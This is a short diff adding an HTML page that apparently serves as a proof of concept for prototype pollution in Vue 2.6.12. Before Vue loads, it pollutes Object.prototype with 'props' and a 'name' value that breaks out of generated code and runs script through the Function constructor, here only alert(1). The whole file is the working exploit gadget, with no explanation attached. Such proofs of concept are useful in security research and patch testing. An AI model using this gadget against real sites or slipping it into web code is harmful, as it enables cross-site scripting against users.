@@ -1,0 +1,16 @@
+<div id="app">
+    {{ message }}
+</div>
+<script>
+    Object.prototype.props = [{value:'a'}];
+    Object.prototype.name = `":''.constructor.constructor('alert(1)')(),"`;
+</script>
+<script src="vue_2_6_12.js"></script>
+<script>
+var app = new Vue({ 
+    el: '#app',
+    data: {
+        message: 'Hello Vue!'
+    }
+});
+</script>
